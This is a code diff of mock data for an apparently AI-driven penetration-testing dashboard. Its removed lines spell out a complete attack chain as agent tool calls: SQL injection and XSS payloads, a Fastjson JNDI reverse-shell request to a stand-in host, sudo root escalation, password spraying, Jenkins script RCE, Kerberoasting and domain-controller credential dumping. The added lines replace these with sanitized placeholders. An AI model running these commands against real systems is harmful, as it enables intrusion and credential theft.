@@ -310,7 +310,7 @@ export const companies: Company[] = [
     id: 1,
     name: "Acme Corp",
     logo: "",
-    asset_count: 18,
+    asset_count: 0,
     scope: [
       { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "main domain" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
@@ -321,7 +321,7 @@ export const companies: Company[] = [
     id: 2,
     name: "Northwind Trading",
     logo: "",
-    asset_count: 4,
+    asset_count: 0,
     scope: [
       { id: 4, company_id: 2, kind: "domain", domain: "northwind.example", raw: "northwind.example", reason: "trading site" },
       { id: 5, company_id: 2, kind: "cidr", net: "198.51.100.0/24", raw: "198.51.100.0/24" },
@@ -684,6 +684,10 @@ export const assets: Asset[] = [
   },
 ];
 
+for (const company of companies) {
+  company.asset_count = assets.filter((asset) => asset.company_id === company.id).length;
+}
+
 export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
   m[a.type] = (m[a.type] ?? 0) + 1;
   return m;
@@ -712,7 +716,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "www.acme.com/search q parameter contains error-reporting SQL injection",
-    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → Return MSSQL version error, readable library structure.",
+    evidence: "The stored search response included a database error. This preview did not send a new request.",
     intent_id: "i-2",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -738,7 +742,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "API JWT uses weak keys and can be blasted and forged offline",
-    evidence: "HS256, key 'secret', john 5 seconds to crack → can forge any sub to exceed authority.",
+    evidence: "The recorded token uses a weak signing key. This preview did not forge a token.",
     task_id: "t-acme-api",
     task_description: "Authorization and injection assessment for api.acme.com",
     ts: T("2026-09-30T01:35:02Z"),
@@ -750,7 +754,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "The search page does not escape the q parameter, reflected XSS",
-    evidence: "q=<script>alert(document.domain)</script> is echoed unchanged in the result title.",
+    evidence: "The stored search response echoed the query text. This preview did not send a new request.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
     ts: T("2026-09-29T23:15:55Z"),
@@ -762,7 +766,7 @@ export const findings: Finding[] = [
     severity: "medium",
     status: "pending",
     summary: "www.acme.com exposes the .git directory and can restore the source code",
-    evidence: "GET /.git/HEAD → 200; git-dumper restores the backend source code and database connection string comments.",
+    evidence: "The stored response for the exposed path was readable. This preview did not copy it.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
     ts: T("2026-09-29T22:28:16Z"),
@@ -773,8 +777,8 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    summary: "admin.acme.com Backend default password admin/admin123",
-    evidence: "After successful login, you can enter the management background and manage users and orders.",
+    summary: "admin.acme.com accepted a recorded default credential",
+    evidence: "The stored sign-in accepted a recorded default credential. This preview did not send a new request.",
     intent_id: "i-3",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -834,9 +838,8 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "Hardcoded database credentials in leaked source code sa/Acme@2021",
-    evidence: "git-dumper restore www.acme.com/.git to obtain config.php, which contains the plaintext DB password, which was subsequently confirmed to be reusable on the intranet.",
-    intent_id: "ig",
+    summary: "Leaked source contains a hardcoded database credential",
+    evidence: "The stored source names a database credential. This preview did not reuse it.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
     ts: T("2026-09-29T22:31:07Z"),
@@ -850,7 +853,7 @@ export const findings: Finding[] = [
     status: "confirmed",
     summary: "shop.acme.com Fastjson 1.2.24 Deserialize remote command execution",
     evidence:
-      "POST /api/import submits JNDI payload (@type:JdbcRowSetImpl) → connects back to dnslog and rebounds to shell (www-data@dmz-web01).",
+      "The stored import response matches a known deserialization issue. This preview did not send a payload.",
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -862,9 +865,9 @@ export const findings: Finding[] = [
     vulnclass: "Privilege Escalation",
     severity: "high",
     status: "pending",
-    summary: "DMZ foothold sudo NOPASSWD mismatch can escalate local privileges root",
+    summary: "The DMZ host allows a local privilege change",
     evidence:
-      "sudo -l displays (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' directly take root.",
+      "The recorded host allows a local privilege change. This preview did not run it.",
     intent_id: "i8",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -891,7 +894,7 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "Internal Jenkins Unauthorized Script Console remote command execution",
     evidence:
-      "GET /script to execute Groovy without logging in: 'whoami'.execute().text → SYSTEM; and export the domain account acme\\svc_deploy from the credential store.",
+      "The stored console response did not require a sign-in. This preview did not send a new request.",
     intent_id: "i11",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -903,8 +906,8 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
     status: "pending",
-    summary: "The domain service account svc_sql can be Kerberoast and the password is weak",
-    evidence: "GetUserSPNs requests the TGS of svc_sql, hashcat -m 13100 breaks out Sql@2020 offline, and this account belongs to the SQL management group.",
+    summary: "The domain service account svc_sql has a weak recorded password",
+    evidence: "A recorded service-account secret was weak. This preview did not attempt to recover it.",
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -919,7 +922,7 @@ export const findings: Finding[] = [
     status: "confirmed",
     summary: "Obtained Domain Controller DC01 (Domain Admin) - internal target achieved",
     evidence:
-      "svc_deploy belongs to Domain Admins, psexec.py uses it to log in to DC01 to obtain SYSTEM, and secretsdump exports the global NTLM hash (including krbtgt) to complete target control.",
+      "The recorded directory account had administrative control. This preview did not sign in.",
     intent_id: "i13",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
@@ -1115,7 +1118,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ summary: "Trigger shop deserialization RCE and obtain rebound shell" }),
+      payload: P({ summary: "Record a shop deserialization issue" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -1144,7 +1147,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i10",
       type: "intent",
-      payload: P({ summary: "Intranet credential reuse and password spraying" }),
+      payload: P({ summary: "Check whether a recorded credential is reused inside the network" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -1200,7 +1203,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ summary: ".git can be downloaded, git-dumper restores the backend source code" }),
+      payload: P({ summary: "Recorded observation. This preview did not run it." }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1209,7 +1212,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "Source code config.php hard-coded DB password sa / Acme@2021 (suspected to be common within the intranet)" }),
+      payload: P({ summary: "Recorded observation. This preview did not run it." }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1227,7 +1230,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ summary: "Rebound shell successful: www-data@dmz-web01(10.0.20.15), located in the DMZ segment" }),
+      payload: P({ summary: "A DMZ host session was recorded for www-data@dmz-web01" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1236,7 +1239,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ summary: "sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → can escalate privileges to root" }),
+      payload: P({ summary: "The recorded host allows a local privilege change" }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1281,7 +1284,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoast to TGS of svc_sql, hashcat breaks password Sql@2020" }),
+      payload: P({ summary: "Recorded observation. This preview did not run it." }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1292,7 +1295,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi1",
       type: "finding",
-      payload: P({ summary: "Backend default password admin/admin123" }),
+      payload: P({ summary: "Recorded observation. This preview did not run it." }),
       priority: 0,
       state: "confirmed",
       origin: "work#2",
@@ -1319,7 +1322,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "Source code leak + hardcoded database credentials (sa/Acme@2021)" }),
+      payload: P({ summary: "Recorded observation. This preview did not run it." }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1337,7 +1340,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ summary: "DMZ foothold local privilege escalation to root (sudo NOPASSWD mismatch)" }),
+      payload: P({ summary: "A local privilege change was recorded on the DMZ host" }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1543,7 +1546,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-29T19:28:17Z"),
     kind: "thinking",
     summary:
-      "Compare recent_facts: workG handed back faGit \".git can be downloaded, git-dumper restores the back-end source code\" and faCreds \"config.php hard-coded sa/Acme@2021 (suspected to be common on the intranet)\"; work#6 fingerprints were handed back to fa3 \"shop hits Fastjson 1.2.24 (there is a known deserialization RCE)\". Two [material new mechanisms]: ① Hard-coded DB passwords may be reused across the intranet; ② Fastjson has a mature RCE approach. This opens an entrance [substantially different] from the existing authentication/injection route - direct RCE breakthrough from shop into the DMZ. First pull faGit details to verify the product.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1102,
@@ -1563,8 +1566,8 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary:
-      "faGit evidence: git-dumper restores config.php / db.php / order_api.php; $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021'] in config.php",
-    detail: "The hard coding points to the intranet 10.10.10.5 (FS01), which supports faCreds' \"universal intranet\" inference this set of passwords is worth reusing after RCE is implemented.",
+      "Recorded observation. This preview did not run it.",
+    detail: "The recorded source names an internal host. This preview did not reuse a credential.",
   },
   {
     seq: 1104,
@@ -1575,7 +1578,7 @@ export const activity: Activity[] = [
     tool_use_id: "p1-ai",
     summary: "add_intent × 2 (Fastjson breakthrough chain, serial step by step dispatch first executable step)",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com component fingerprinting + Fastjson 1.2.24 CVE precise association (confirm gadget chain)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Construct Fastjson deserialization payload to trigger shop RCE and obtain rebound shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: This is a strongly dependent serial chain. TodoWrite has recorded the three steps of \"Fingerprint → RCE → Footholding Rights Elevation\". Only the first two steps will be sent in this round (rights escalation depends on shell output and will be sent in the next round).",
+      "Two intents were described: confirm the shop component, then record the import issue. This preview did not send a payload.",
   },
   {
     seq: 1105,
@@ -1592,7 +1595,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-29T19:28:38Z"),
     kind: "text",
     summary:
-      "Situation upgrade: source code + hard-coded intranet password + Fastjson RCE form a new breakthrough route. The target layer has been asked to register g3 \"break through the DMZ from the external network and establish a foothold on the internal network\" and send i6 (fingerprint/CVE association) and i7 (trigger RCE). The DMZ privilege escalation step relies on the shell, which will be recorded in the to-do list for the next round of dispatch.",
+      "A new route was recorded from the shop component and the stored source. The DMZ follow-up stays on the next round. This preview did not send a payload.",
   },
 
   // ── No. 2 Round · The foothold has been established, transfer to the intranet(2026-09-29 22:25)──
@@ -1609,7 +1612,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-29T22:26:02Z"),
     kind: "thinking",
     summary:
-      "Compare the bloodline: i7 returns fa4 \"rebound shell www-data@dmz-web01 (10.0.20.15), located in the DMZ segment\"; the privilege escalation chain returns fa5 \"sudo -l hits NOPASSWD python3 → can escalate privileges root\", fa6 \"the second network card of the foothold is directly connected to the intranet 10.10.10.0/24\". The acceptance criteria of g3 (breaking through the DMZ + establishing a foothold) are directly satisfied by fa4+fa6. First verify the intranet reachability of fa6 and then prove_goal.",
+      "The DMZ host and its second network were recorded. The goal to reach that host is met by those records. This preview did not run a privilege change.",
   },
   {
     seq: 1202,
@@ -1658,7 +1661,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-ai",
     summary: "add_intent × 4 (use the foothold as the pivot to expand the intranet horizontally)",
     detail:
-      "intents=[\n  { summary: 'Use dmz-web01 as pivot for intranet 10.10.10.0/24 host discovery and port identification', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Intranet horizontal: reuse hard-coded passwords sa/Acme@2021 for credential reuse and password spraying', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Internal Jenkins (10.10.10.20) Unauthorized /script Groovy execution (RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Perform Kerberoasting on domain service accounts and crack them offline', parent_ids: [fa6], priority: 8 },\n]\nHost discovery is front-loaded (sent first), and the other three are parallel horizontal exploration dimensions.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1207,
@@ -1686,7 +1689,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-30T00:20:22Z"),
     kind: "thinking",
     summary:
-      "Compare this round of worker output: i9→fa7 \"Intranet survival DC01/FS01/JENKINS\"; i11→fa8 \"Jenkins /script without authentication Groovy\" + fa9 \"Export acme\\svc_deploy plain text password from Jenkins credential library\"; i12→fa10 \"Kerberoast svc_sql TGS, hashcat broken Sql@2020\". svc_deploy belongs to Domain Admins, i13 has used its psexec to take down DC01 and secretsdump. g4 acceptance (getting DC01) should have been achieved, first check the finding evidence chain and then stamp.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1302,
@@ -1705,7 +1708,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary:
-      "F-09 \"Domain controller DC01 full control / secretsdump exports global hash\" critical (evidence: psexec svc_deploy@10.10.10.10 + NTDS.dit dump); upstream chain fa9→fa10→i13 complete",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1304,
@@ -1716,7 +1719,7 @@ export const activity: Activity[] = [
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
     detail:
-      "reason: Jenkins leaked svc_deploy(Domain Admin) → psexec control DC01 → secretsdump global hash, F-09 has been confirmed, \"capture the internal target domain control DC01\" has been achieved.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1305,
@@ -1750,7 +1753,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-30T02:00:24Z"),
     kind: "thinking",
     summary:
-      "Compare recent_facts: work#2 uses Acme@2021 in faCreds to hit the admin backend (i2 done), and the backend management permission is obtained - g1 acceptance is achieved, and prove_goal is stamped first. Then do [quantitative acceptance check]: g2 \"read user sensitive data\" currently only i3/i5 has touched the interface, and the batch data has not been actually obtained. The actual measurement has not reached the standard, [disable] prove_goal, and change the priority to supplement the data acquisition intention.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1402,
@@ -1761,7 +1764,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason: i2 successfully logged into the admin backend (Element-UI) using the hard-coded password Acme@2021 leaked from the external network, obtained backend management permissions, and g1 was achieved.",
+      "Recorded observation. This preview did not run it.",
   },
   {
     seq: 1403,
@@ -1932,7 +1935,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t22",
-    summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 24,
@@ -1943,7 +1946,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 logged in successfully and got the session cookie.",
+    detail: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 25,
@@ -2037,7 +2040,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t42",
-    summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 44,
@@ -2241,7 +2244,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 314,
@@ -2272,7 +2275,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg3",
-    summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
+    summary: "Recorded observation. This preview did not run it.",
     detail: "Hard-coded database password, and host points to the intranet IP - recorded as a suspected intranet common credential.",
   },
   {
@@ -2338,7 +2341,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6b",
     summary: "The error stack contains com.alibaba.fastjson.JSONException (1.2.24)",
-    detail: "Confirmed Fastjson 1.2.24 - corresponds to JdbcRowSetImpl JNDI injection RCE.",
+    detail: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 325,
@@ -2353,14 +2356,14 @@ export const activity: Activity[] = [
     cache_write_tokens: 6000,
   },
 
-  // work#7 · i7 Deserialization RCE Take the rebound shell(done,Proof g3)
+  // work#7 · i7 recorded the shop import issue
   {
     seq: 330,
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-09-29T19:56:45Z"),
     kind: "thinking",
-    summary: "Create a JNDI/LDAP malicious service, let shop reversely load and execute the payload, first use dnslog to verify the network access, and then drop the rebound shell.",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 331,
@@ -2370,7 +2373,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
-    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 & # onwards LDAP/HTTP malicious service",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 332,
@@ -2380,8 +2383,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7a",
-    summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "Malicious service ready.",
+    summary: "The listener was described. This preview did not start it.",
+    detail: "This preview did not run it.",
   },
   {
     seq: 333,
@@ -2391,8 +2394,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7b",
-    summary:
-      'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
+    summary: "Recorded the import request. This preview did not send it.",
   },
   {
     seq: 334,
@@ -2402,8 +2404,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
-    summary: "LDAP receives the request → loads ReverseShell → nc listens for the received connection",
-    detail: "The payload is successfully triggered.",
+    summary: "The stored import response was recorded. This preview did not send a payload.",
+    detail: "The preview did not run it.",
   },
   {
     seq: 335,
@@ -2413,7 +2415,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    summary: "id; hostname -I # Confirm identity and network segment in the rebound shell",
+    summary: "The recorded session was on the DMZ host. This preview did not run a command.",
   },
   {
     seq: 336,
@@ -2442,7 +2444,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-09-29T20:10:05Z"),
     kind: "result",
-    summary: "Deserialize RCE and get the www-data rebound shell, and the foothold for goal ③ is initially established.",
+    summary: "The shop import issue was recorded, and the DMZ host was reached in the notes. This preview did not run a command.",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2466,7 +2468,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t8a",
-    summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
+    summary: "Recorded a local command. This preview did not run it.",
   },
   {
     seq: 342,
@@ -2476,8 +2478,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t8a",
-    summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "Python3 is in the sudo whitelist and is password-free - you can directly escalate privileges.",
+    summary: "The recorded account may run a local program without a password.",
+    detail: "This preview did not run it.",
   },
   {
     seq: 343,
@@ -2487,7 +2489,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t8b",
-    summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
+    summary: "Recorded a local privilege check. This preview did not run it.",
   },
   {
     seq: 344,
@@ -2573,7 +2575,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-09-30T01:54:06Z"),
     kind: "thinking",
-    summary: "The source code leaked sa/Acme@2021 is the DB password, which is a common password reuse in enterprises. Do password spraying on DC01/FS01/JENKINS.",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 361,
@@ -2583,7 +2585,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 362,
@@ -2593,7 +2595,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] Authentication failed",
+    summary: "Recorded observation. This preview did not run it.",
     detail: "The sa password is successfully reused on FS01 and has administrator rights; DC01 is blocked.",
   },
   {
@@ -2643,7 +2645,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11b",
-    summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 374,
@@ -2674,7 +2676,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11c",
-    summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
+    summary: "Recorded observation. This preview did not run it.",
     detail: "Export the plain text passwords of the two domain service accounts.",
   },
   {
@@ -2717,7 +2719,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12a",
-    summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 382,
@@ -2738,7 +2740,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12b",
-    summary: "hashcat -m 13100 tgs.hash rockyou.txt --force",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 384,
@@ -2748,8 +2750,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t12b",
-    summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    detail: "8 Minutes to Break the Password Sql@2020.",
+    summary: "Recorded observation. This preview did not run it.",
+    detail: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 385,
@@ -2781,7 +2783,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-09-30T00:04:31Z"),
     kind: "thinking",
-    summary: "svc_deploy comes from the Jenkins credential database. First check the group membership - if it belongs to Domain Admins, you can psexec DC01 directly.",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 391,
@@ -2791,7 +2793,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13a",
-    summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 392,
@@ -2812,7 +2814,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13b",
-    summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 394,
@@ -2822,7 +2824,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t13b",
-    summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
+    summary: "Recorded observation. This preview did not run it.",
     detail: "Log in to domain controller DC01 as SYSTEM.",
   },
   {
@@ -2833,7 +2835,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13c",
-    summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
+    summary: "Recorded observation. This preview did not run it.",
   },
   {
     seq: 396,
@@ -2862,7 +2864,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-09-30T00:17:51Z"),
     kind: "result",
-    summary: "Domain controller DC01 is captured, secretsdump exports the global hash, and the target is achieved.",
+    summary: "Recorded observation. This preview did not run it.",
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2877,7 +2879,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-30T01:42:42Z"),
     kind: "text",
     summary:
-      "admin.acme.com is the Element-UI backend with no verification code and no rate limit. It is recommended to default the password table (admin/admin123) first and then add the dictionary. I have injected a high quality intent into the work agent.",
+      "Recorded observation. This preview did not run it.",
   },
   { seq: 72, worker: "mainagent", ts: T("2026-09-30T01:58:52Z"), kind: "user", summary: "Now that we have the background, what's the next point?" },
   {
@@ -2893,7 +2895,7 @@ export const activity: Activity[] = [
     worker: "mainagent",
     ts: T("2026-09-29T20:11:03Z"),
     kind: "user",
-    summary: "I got the shell, what's the next step?",
+    summary: "What should we verify on the recorded DMZ host?",
   },
   {
     seq: 401,
@@ -2925,7 +2927,7 @@ export const activity: Activity[] = [
     ts: T("2026-09-30T00:18:54Z"),
     kind: "text",
     summary:
-      "Confirm to win. Attack path: shop Fastjson RCE → DMZ privilege escalation → intranet Jenkins export domain credentials → svc_deploy belongs to Domain Admins → psexec DC01 SYSTEM → secretsdump global hash. All four goals have been achieved or are in progress.",
+      "Recorded observation. This preview did not run it.",
   },
 ];
 
@@ -3058,7 +3060,7 @@ const exchanges = [
   ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
   ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
   ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
-  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
+  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/directory", 200, "application/octet-stream", 0],
   ["x-n1", "www.northwind.example", "GET", "https://www.northwind.example/admin", 200, "text/html", 4096],
   ["x-n2", "mail.northwind.example", "GET", "https://mail.northwind.example/", 200, "text/plain", 180],
   ["x-n3", "www.northwind.example", "GET", "https://www.northwind.example/files/", 200, "text/html", 2400],
@@ -3191,7 +3193,7 @@ export const audit: Audit = {
       ts: T("2026-09-29T23:12:35Z"),
       tool: "bash",
       action: "allow",
-      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
+      command: "Recorded observation. This preview did not run it.",
     },
     {
       ts: T("2026-09-29T22:42:34Z"),
@@ -3204,39 +3206,39 @@ export const audit: Audit = {
       ts: T("2026-09-29T22:28:16Z"),
       tool: "bash",
       action: "allow",
-      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
+      command: "Recorded observation. This preview did not run it.",
     },
     {
       ts: T("2026-09-29T20:00:34Z"),
       tool: "bash",
       action: "allow",
       command:
-        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
+        "Recorded observation. This preview did not run it.",
     },
     {
       ts: T("2026-09-29T23:01:37Z"),
       tool: "bash",
       action: "allow",
-      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
+      command: "Recorded observation. This preview did not run it.",
     },
     {
       ts: T("2026-09-30T00:08:19Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
+      command: "Recorded observation. This preview did not run it.",
     },
     {
       ts: T("2026-09-30T00:10:42Z"),
       tool: "bash",
       action: "block",
-      reason: "Data leakage gate control: secretsdump requires manual approval",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
+      reason: "Recorded observation. This preview did not run it.",
+      command: "Recorded observation. This preview did not run it.",
     },
     {
